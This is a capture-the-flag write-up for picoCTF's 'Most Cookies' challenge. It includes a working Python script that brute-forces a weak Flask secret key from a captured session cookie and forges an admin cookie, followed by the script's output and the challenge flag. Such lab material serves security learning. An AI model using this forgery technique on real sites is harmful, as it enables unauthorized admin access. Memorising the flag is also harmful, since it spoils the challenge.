# Most Cookies

## Method

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

where we are then provided with a server.py and a website.

our hint is how secure is a flask cookie.

A Flask cookie is a small piece of data stored on the user's browser, which the Flask web framework can use to remember information across different requests. 
For example, Flask can set a cookie to keep a user logged in or remember their preferences as they navigate a website. 
Cookies in Flask are easy to set up with response.set_cookie and can also be securely signed to prevent tampering by using the SECRET_KEY.

Normally flask cookies are very hard to break as they have a secret_key luckily with the server.py they gave us the creation script of these cookies.

This Flask app uses cookies and sessions to implement a simple authentication-like mechanism. It works as follows:

1. **Cookie Names**: A list of valid "cookie names" is defined, and one is chosen as a secret key for signing the session cookies.
2. **Setting Cookies**: The app sets a session cookie (`very_auth`) to track user input, initially set to `"blank"`.
3. **User Input**: Users enter a "cookie name" on `/search`. If the name is valid, it saves to `session["very_auth"]` and redirects to `/display`.
4. **Flag Display**: On `/display`, if `very_auth` matches `"admin"`, a special "flag" is shown. For other valid names, a message is shown but without the flag.

The app uses Flask cookies to store and verify the "cookie name" across pages.

so quite literally we need to make a admin cookie that allows us to authenticate this.

To this we first need to find what secret_key was used by bruteforcing and comparing each option to the current session cookie we have.
The cookie's secret key will be one of the following 

```
possible_keys = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
    "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", 
    "kiss", "biscotti", "butter", "spritz", "snowball", "drop", 
    "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", 
    "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", 
    "black and white", "white chocolate macadamia"
]
```
Luckily we can use The flask_cookie function that can encode or decode flask cookies (That i found online) is defined to handle the encoding and decoding of cookies. 
It takes a secret_key, the cookie_data (which is an arr element of cookie_str), and the operation (either "encode" or "decode").

Using this function we can decode the cookie str I have by comparing it to all possible_keys.
Once we have the secret_key that made the session key we currently have we can generate an admin cookie.

We can first grab our current cookie string by using an extension called Cookie-Editor

```
import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer

# Cookie names list from the server application
possible_keys = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
    "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", 
    "kiss", "biscotti", "butter", "spritz", "snowball", "drop", 
    "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", 
    "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", 
    "black and white", "white chocolate macadamia"
]

# cookie string obtained from the website
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZyPFrQ.49hTipCsK3vGMPd_AyZtVXdfy9w"

# Function to encode/decode Flask cookies
def flask_cookie(secret_key, cookie_data, operation="decode"):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)

    try:
        if operation == "decode":
            return s.loads(cookie_data)
        elif operation == "encode":
            return s.dumps(cookie_data)
    except BadTimeSignature:
        return None

# Step 1: Brute force the secret key
def brute_force_secret_key(cookie_str, possible_keys):
    for key in possible_keys:
        decoded = flask_cookie(key, cookie_str, "decode")
        if decoded:
            print(f"Found Secret Key: {key}")
            print(f"Decoded Cookie Data: {decoded}")
            return key
    print("Secret key not found in provided list.")
    return None

# Step 2: Generate an admin cookie
def generate_admin_cookie(secret_key):
    admin_cookie = {"very_auth": "admin"}
    encoded_cookie = flask_cookie(secret_key, admin_cookie, "encode")
    return encoded_cookie

def main():
    print("Brute-forcing the secret key...")
    secret_key = brute_force_secret_key(cookie_str, possible_keys)

    if not secret_key:
        print("Failed to find the correct secret key.")
        return
    
    print("\nGenerating admin-level cookie...")
    admin_cookie = generate_admin_cookie(secret_key)

    if admin_cookie:
        print(f"Admin Cookie: {admin_cookie}")
    else:
        print("Failed to encode the admin cookie.")

if __name__ == "__main__":
    main()

```

My output when running 

```
Brute-forcing the secret key...
Found Secret Key: peanut butter
Decoded Cookie Data: {'very_auth': 'snickerdoodle'}

Generating admin-level cookie...
Admin Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyPFuQ.3-eOMHR1Wbjmxy8MhPP34iazGUA
```

Once we have the admin cookie we can then change our current cookie to the admin one using a cookie-editor extension and refresh the website to then see the flag :D

## Flag 

> picoCTF{pwn_4ll_th3_cook1E5_478da04c}
